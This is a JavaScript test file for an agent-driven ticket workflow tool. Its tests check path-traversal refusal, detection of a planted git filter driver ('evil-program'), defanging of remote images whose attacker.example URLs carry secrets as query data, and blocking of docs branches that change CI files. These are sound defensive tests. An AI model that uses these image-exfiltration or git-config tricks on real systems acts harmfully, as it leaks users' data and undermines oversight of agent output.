  for (const key of ['repos', 'topology', 'qa']) assert.ok(snap[key] !== undefined, `the snapshot holds ${key}`);
  for (const [mutate, pattern] of [
    [(m) => { m.repos[0].path = 'elsewhere'; }, /repos\[0\]\.path/],
    [(m) => { m.topology = 'root'; }, /topology/],
    [(m) => { m.qa.urls.frontend = 'http://attacker.example'; }, /qa\.urls\.frontend/],
    [(m) => { delete m.qa; }, /\bqa\b/],
  ]) {
    writeMarker(ws, mutate);
    const status = run(ws, ['status', 'GH-16']);
    assert.equal(status.code, 0, status.stdout + status.stderr);
    assert.match(status.json.configChange ?? '', pattern, status.stdout);
    fs.writeFileSync(markerFile(ws), original);
    assert.equal(run(ws, ['status', 'GH-16']).json.configChange, undefined, 'the file as it was: no change');
  }
  writeMarker(ws, (m) => { delete m.qa; });
  const r = run(ws, ['next', 'GH-16']);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'config-changed');
  assert.match(r.json.error.message, /\bqa\b/);
});

test('round3 Medium 13: a repos[].path that is absolute or holds .. is refused with bad-repos; a path under the root is not', () => {
  const ws = workspace({ nested: true });
  const refused = ['..', '../outside', 'a/../../b', 'a\\..\\b', '/etc', path.join(os.tmpdir(), 'elsewhere'), 'C:\\Users\\x', '\\\\server\\share\\r'];
  for (const bad of refused) {
    writeMarker(ws, (m) => { m.repos[0].path = bad; });
    const r = run(ws, ['status', 'GH-16']);
    assert.equal(r.json?.error?.code, 'bad-repos', `${bad}: ${r.stdout}${r.stderr}`);
    assert.match(r.json.error.message, /repos\[backend\]\.path/);
  }
  for (const good of ['backend', 'apps/web', 'a..b', '.']) {
    writeMarker(ws, (m) => { m.repos[0].path = good; });
    const r = run(ws, ['status', 'GH-16']);
    assert.equal(r.code, 0, `${good}: ${r.stdout}${r.stderr}`);
  }
  // No path: the engine falls back to the name, which is held to the same rule.
  writeMarker(ws, (m) => { delete m.repos[0].path; m.repos[0].name = '../x'; });
  assert.equal(run(ws, ['status', 'GH-16']).json?.error?.code, 'bad-repos');
});

test('round3 Medium 13: a ticket keeps the repositories it began with; a path a stage writes later is a config change, and accepting it with begin is refused while it leaves the project', () => {
  const ws = workspace({ nested: true });
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  writeMarker(ws, (m) => { m.repos[0].path = '../outside'; });
  const status = run(ws, ['status', 'GH-16']);
  assert.equal(status.code, 0, status.stdout + status.stderr);
  assert.match(status.json.configChange, /repos\[0\]\.path/, 'the snapshot repos are used; the live path is only a difference');
  assert.equal(run(ws, ['next', 'GH-16']).json.error.code, 'config-changed');
  const again = run(ws, ['begin', 'GH-16', 'spec']);
  assert.equal(again.json?.error?.code, 'bad-repos', again.stdout + again.stderr);
  assert.equal(JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8')).repos[0].path, 'backend', 'the refused path was not taken as the new baseline');
  writeMarker(ws, (m) => { m.repos[0].path = 'backend'; });
  assert.equal(run(ws, ['begin', 'GH-16', 'spec']).code, 0, 'with the path back, begin goes on');
});

test('round3 Medium 15: status compares the git config too, reports a changed watched key, and runs no git that checks out', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  const ticketBranch = git(ws.root, 'branch', '--show-current');
  assert.match(ticketBranch, /^GH-16-/);
  // Control: with nothing changed, status still puts the documents repository on the ticket's branch.
  git(ws.root, 'checkout', '-q', 'main');
  const calm = run(ws, ['status', 'GH-16']);
  assert.equal(calm.code, 0, calm.stdout + calm.stderr);
  assert.equal(calm.json.gitConfigChange, undefined);
  assert.equal(git(ws.root, 'branch', '--show-current'), ticketBranch);
  // A filter driver planted in .git/config: status reports it and leaves the work tree alone.
  git(ws.root, 'checkout', '-q', 'main');
  git(ws.root, 'config', 'filter.pwn.clean', 'evil-program');
  const planted = run(ws, ['status', 'GH-16']);
  assert.equal(planted.code, 0, planted.stdout + planted.stderr);
  assert.match(planted.json.gitConfigChange, /filter\.pwn\.clean/);
  assert.match(planted.json.gitConfigChange, /blocked|run begin again/);
  assert.equal(git(ws.root, 'branch', '--show-current'), 'main', 'status did not check out the ticket branch');
});

// ---------------------------------------------------------------------------------------------
// Round 3, Medium 21: a remote image in agent-written markdown is an egress channel
// ---------------------------------------------------------------------------------------------

test('round3 Medium 21: defangRemoteImages turns a remote markdown or HTML image into a link text and leaves the rest alone', () => {
  const d = lib.defangRemoteImages;
  assert.equal(d('![shot](https://attacker.example/p.png?d=SECRET)'), '[image: shot](<https://attacker.example/p.png?d=SECRET>)');
  assert.equal(d('![](http://attacker.example/p.png)'), '[image](<http://attacker.example/p.png>)');
  assert.equal(d('before ![a b](<https://x.example/a b.png> "title") after'), 'before [image: a b](<https://x.example/a%20b.png>) after');
  assert.equal(d('![x](https://x.example/p_(1).png)'), '[image: x](<https://x.example/p_(1).png>)');
  assert.equal(d('![x](//x.example/p.png)'), '[image: x](<//x.example/p.png>)');
  assert.equal(d('![nested [brackets] here](https://x.example/p.png)'), '[image: nested brackets here](<https://x.example/p.png>)');
  assert.equal(d('<img src="https://x.example/p.png" alt="the shot">'), '[image: the shot](<https://x.example/p.png>)');
  assert.equal(d("<IMG ALT='a>b' SRC='HTTPS://x.example/p.png' width=5>"), '[image: a>b](<HTTPS://x.example/p.png>)');
  assert.equal(d('<img src=https://x.example/p.png>'), '[image](<https://x.example/p.png>)');
  assert.equal(d('<img srcset="https://x.example/a.png 1x, https://x.example/b.png 2x">'), '[image](<https://x.example/a.png>)');
  assert.equal(d('<video src="https://x.example/v.mp4"></video>'), '[video](<https://x.example/v.mp4>)</video>');
  // Reference-style images carry the URL in a definition; the image becomes a text link.
  assert.equal(d('![alt][r]\n\n[r]: https://x.example/p.png'), '[image: alt][r]\n\n[r]: https://x.example/p.png');
  assert.equal(d('![alt]'), '[image: alt]');
  // A URL spelled with entities, backslash escapes or a tab in its scheme is still remote.
  assert.equal(d('![x](h&#116;tps://x.example/p.png)'), '[image: x](<https://x.example/p.png>)');
  assert.equal(d('![x](https&colon;//x.example/p.png)'), '[image: x](<https://x.example/p.png>)');
  assert.equal(d('![x](https\\://x.example/p.png)'), '[image: x](<https://x.example/p.png>)');
  assert.equal(d('<img src="ht\ttps://x.example/p.png">'), '[image](<https://x.example/p.png>)');
  // Not remote: a relative path, a data URL, a link that is not an image, plain text, an empty input.
  for (const keep of ['![shot](artifacts/a.png)', '![shot](/uploads/abc/a.png)', '![x](data:image/png;base64,AAAA)', '[a link](https://x.example/p.png)', '<https://x.example/p.png>', 'Hello! [see](x)', '<img src="artifacts/a.png">', '']) {
    assert.equal(d(keep), keep, keep);
  }
  assert.equal(d(null), '');
  assert.equal(d(d('![x](https://x.example/p.png) <img src="https://x.example/q.png">')), d('![x](https://x.example/p.png) <img src="https://x.example/q.png">'), 'idempotent');
  // What it writes cannot be read back as an image.
  assert.ok(!/!\[/.test(d('![a](https://x.example/p.png)![b][c]')));
});

// Verification of round 3, Medium 21: a renderer fetches more than <img>. A remote address in src, srcset,
// poster, data or background on any tag, and the href of <link> and <base>, is written as a link text too.
test('round3 Medium 21: defangRemoteImages also defangs a remote poster, input image, object data, link href, embed, background, iframe and srcset candidate, and leaves a link alone', () => {
  const d = lib.defangRemoteImages;
  assert.equal(d('<video poster="https://attacker.example/p.png?d=SECRET"></video>'), '[video](<https://attacker.example/p.png?d=SECRET>)</video>');
  assert.equal(d('<input type="image" src="https://attacker.example/i.png?d=SECRET" alt="go">'), '[input: go](<https://attacker.example/i.png?d=SECRET>)');
  assert.equal(d('<object data="https://attacker.example/o.svg?d=SECRET"></object>'), '[object](<https://attacker.example/o.svg?d=SECRET>)</object>');
  assert.equal(d('<link rel="stylesheet" href="https://attacker.example/s.css?d=SECRET">'), '[link](<https://attacker.example/s.css?d=SECRET>)');
  assert.equal(d('<LINK REL=icon HREF=//attacker.example/f.ico>'), '[link](<//attacker.example/f.ico>)');
  assert.equal(d('<embed src=https://attacker.example/e.svg?d=SECRET>'), '[embed](<https://attacker.example/e.svg?d=SECRET>)');
  assert.equal(d('<table background="https://attacker.example/b.png?d=SECRET"><tr>'), '[table](<https://attacker.example/b.png?d=SECRET>)<tr>');
  assert.equal(d('<div BACKGROUND=//attacker.example/b.png>x</div>'), '[div](<//attacker.example/b.png>)x</div>');
  assert.equal(d('<iframe src="https://attacker.example/f?d=SECRET"></iframe>'), '[iframe](<https://attacker.example/f?d=SECRET>)</iframe>');
  assert.equal(d('<base href="https://attacker.example/">'), '[base](<https://attacker.example/>)');
  assert.equal(d('<video poster="h&#116;tps://attacker.example/p.png"></video>'), '[video](<https://attacker.example/p.png>)</video>');
  assert.equal(d('<img/src="https://attacker.example/p.png">'), '[image](<https://attacker.example/p.png>)');
  // A srcset names several candidates, and the first may be local.
  assert.equal(d('<img srcset="a.png 1x, https://attacker.example/b.png?d=SECRET 2x">'), '[image](<https://attacker.example/b.png?d=SECRET>)');
  // A link is a click, not a request the renderer makes on its own; a local or inline address is no egress.
  for (const keep of [
    '<a href="https://attacker.example/p.png">x</a>', '<a href="https://attacker.example/" title="data=https://attacker.example/">x</a>',
    '<img alt="src=https://attacker.example/p.png" src="artifacts/p.png">', '<video poster="artifacts/p.png"></video>', '<input type="image" src="artifacts/i.png">',
    '<link rel="stylesheet" href="artifacts/s.css">', '<object data="data:text/plain;base64,AAAA"></object>', '<base href="/docs/">', '<table background="images/b.png">',
  ]) {
    assert.equal(d(keep), keep, keep);
  }
  assert.equal(d(d('<video poster="https://attacker.example/p.png"></video><link href="https://attacker.example/s.css">')), d('<video poster="https://attacker.example/p.png"></video><link href="https://attacker.example/s.css">'), 'idempotent');
});

test('round3 Medium 21: a remote image in a blocked stage message reaches the ticket as a link text, not an image', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  const message = 'Blocked. ![x](https://attacker.example/p.png?d=THE-DATA) and <img src="https://attacker.example/q.png?d=MORE">';
  const r = run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: false, message })]);
  assert.equal(r.code, 0, r.stdout + r.stderr);
  const posted = callRecords(ws).filter((c) => c.args[0] === 'issue' && c.args[1] === 'comment').map((c) => c.stdin).join('\n');
  assert.match(posted, /blocked at stage scaffold/);
  assert.ok(posted.includes('[image: x](<https://attacker.example/p.png?d=THE-DATA>)'), posted);
  assert.ok(posted.includes('[image](<https://attacker.example/q.png?d=MORE>)'), posted);
  assert.ok(!/!\[x\]|<img/i.test(posted), posted);
});

// ---------------------------------------------------------------------------------------------
// Round 3, Medium 22: the gate pushes the documents branch only when it holds documents
// ---------------------------------------------------------------------------------------------

const remoteHas = (ws, branch) => git(ws.root, 'ls-remote', '--heads', ws.origin, branch).trim() !== '';

test('round3 Medium 22: the gate refuses to push a documents branch that changes a path outside the ticket folders, and blocks the stage with docs-scope', () => {
  const ws = workspace();
  throughPlan(ws);
  const branch = git(ws.root, 'branch', '--show-current');
  fs.mkdirSync(path.join(ws.root, '.circleci'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, '.circleci', 'config.yml'), 'version: 2.1\n');
  fs.writeFileSync(path.join(ws.root, 'Jenkinsfile'), 'pipeline {}\n');
  git(ws.root, 'add', '-A');
  git(ws.root, 'commit', '-q', '-m', 'docs: a harmless note');
  const r = run(ws, ['packet', 'GH-16']);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'docs-scope');
  assert.match(r.json.error.message, /\.circleci\/config\.yml/);
  assert.match(r.json.error.message, /Jenkinsfile/);
  assert.match(r.json.error.message, /tasks\/GH-16\//);
  assert.ok(!remoteHas(ws, branch), 'nothing was pushed');
  assert.equal(state(ws).stageStatus, 'blocked');
  assert.equal(state(ws).stage, 'gate');
  assert.ok(ws.calls().some((a) => a.includes('--add-label') && a.includes('up:blocked')), 'the ticket is labelled blocked');
  const posted = callRecords(ws).filter((c) => c.args[0] === 'issue' && c.args[1] === 'comment').map((c) => c.stdin).join('\n');
  assert.match(posted, /docs-scope/);
  assert.ok(!/Packet id/i.test(posted), 'no packet was posted');
});

test('round3 Medium 22: another ticket\'s folder, a root file or a docs/ file counts as outside; the ticket\'s folders and the kb folders do not; a file added and removed again is clean', () => {
  const ws = workspace();
  throughPlan(ws);
  const branch = git(ws.root, 'branch', '--show-current');
  const commit = (message) => { git(ws.root, 'add', '-A'); git(ws.root, 'commit', '-q', '-m', message); };
  const put = (file, text = 'text\n') => { fs.mkdirSync(path.dirname(path.join(ws.root, file)), { recursive: true }); fs.writeFileSync(path.join(ws.root, file), text); };
  for (const file of ['specs/GH-17/Spec.md', 'README.md', 'docs/guide.md', 'src/app.js']) {
    const before = fs.existsSync(path.join(ws.root, file)) ? fs.readFileSync(path.join(ws.root, file)) : null;
    put(file, 'changed\n');
    commit(`docs: ${file}`);
    const r = run(ws, ['packet', 'GH-16']);
    assert.equal(r.json?.error?.code, 'docs-scope', `${file}: ${r.stdout}${r.stderr}`);
    assert.ok(r.json.error.message.includes(file), r.json.error.message);
    assert.ok(!remoteHas(ws, branch), `${file}: nothing pushed`);
    // Removing it again in a later commit leaves the branch holding documents only.
    if (before) fs.writeFileSync(path.join(ws.root, file), before);
    else git(ws.root, 'rm', '-q', '-f', file);
    commit(`docs: take ${file} out again`);
  }
  assert.ok(readMarker(ws).kb.includes('handbooks'), 'the scaffold lists the knowledge-base folders');
  for (const file of ['reviews/GH-16/notes.md', 'tasks/GH-16/attachments/a.txt', 'handbooks/Architecture.md', 'playbooks/Release.md']) put(file);
  commit('docs: notes');
  const ok = run(ws, ['packet', 'GH-16']);
  assert.equal(ok.code, 0, ok.stdout + ok.stderr);
  assert.ok(remoteHas(ws, branch), 'a branch of documents is pushed');
});

test('round3 Medium 22: pathsOutside lists what the branch changes outside the folders, compares against origin/<base> when it exists and the local base otherwise, and fails closed', () => {
  const dir = tempRepo();
  const allowed = ['tasks/X/', 'handbooks/'];
  const put = (file, text) => { fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true }); fs.writeFileSync(path.join(dir, file), text); git(dir, 'add', '-A'); git(dir, 'commit', '-q', '-m', file); };
  git(dir, 'checkout', '-q', '-b', 'feat');
  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', allowed), [], 'no change at all');
  put('tasks/X/a.md', '1\n');
  put('handbooks/h.md', '1\n');
  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', allowed), []);
  put('.github/workflows/ci.yml', 'on: push\n');
  put('a.txt', 'changed\n');
  git(dir, 'mv', 'tasks/X/a.md', 'moved.md');
  git(dir, 'commit', '-q', '-m', 'move');
  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', allowed), ['.github/workflows/ci.yml', 'a.txt', 'moved.md']);
  // The base moved on after the branch began: its changes are not the branch's.
  git(dir, 'checkout', '-q', 'main');
  put('upstream.txt', 'new on main\n');
  git(dir, 'checkout', '-q', 'feat');
  assert.ok(!repos.pathsOutside(dir, 'feat', 'main', allowed).includes('upstream.txt'));
  // A local base behind origin/main, the branch begun on origin/main: only the branch's own paths.
  const dir2 = tempRepo();
  git(dir2, 'checkout', '-q', '-b', 'newer');
  fs.writeFileSync(path.join(dir2, 'up.txt'), 'upstream\n');
  git(dir2, 'add', '-A');
  git(dir2, 'commit', '-q', '-m', 'upstream');
  git(dir2, 'update-ref', 'refs/remotes/origin/main', git(dir2, 'rev-parse', 'HEAD'));
  git(dir2, 'checkout', '-q', '-b', 'feat');
  fs.mkdirSync(path.join(dir2, 'tasks', 'X'), { recursive: true });
  fs.writeFileSync(path.join(dir2, 'tasks', 'X', 'a.md'), '1\n');
  git(dir2, 'add', '-A');
  git(dir2, 'commit', '-q', '-m', 'doc');
  assert.deepEqual(repos.pathsOutside(dir2, 'feat', 'main', allowed), [], 'the upstream commit is origin/main\'s, not the branch\'s');
  // Fails closed: no base, an option for a name, an unknown branch.
  assert.equal(repos.pathsOutside(dir, 'feat', 'no-such-base', allowed), null);
  assert.equal(repos.pathsOutside(dir, 'feat', '--output=x', allowed), null);
  assert.equal(repos.pathsOutside(dir, '-x', 'main', allowed), null);
  assert.equal(repos.pathsOutside(dir, 'no-such-branch', 'main', allowed), null);
});

// Verification of round 3, Medium 22: a stage can run `git checkout -B main HEAD`, which moves the local base
// to the ticket branch's tip, so that the nearer of the two bases shows no change at all. The remote-tracking
// base is the reference when there is one; the local base only when the repository has no such ref.
test('round3 Medium 22: pathsOutside measures from the nearest base, so an unpushed base commit of the owner is not the ticket\'s change', () => {
  const dir = tempRepo();
  git(dir, 'update-ref', 'refs/remotes/origin/main', git(dir, 'rev-parse', 'HEAD'));
  fs.writeFileSync(path.join(dir, 'LOCAL.md'), 'not pushed\n');
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', 'local: unpushed base commit');
  git(dir, 'checkout', '-q', '-b', 'feat');
  fs.mkdirSync(path.join(dir, 'tasks', 'X'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'tasks', 'X', 'a.md'), '1\n');
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', 'work');
  assert.deepEqual(repos.pathsOutside(dir, 'feat', 'main', ['tasks/X/']), [], 'LOCAL.md sits on the base, not on the ticket branch');
  // A stage cannot move the base onto its tip: git checkout -B and git switch -C are refused in autopilot (the guardrail tests).
});
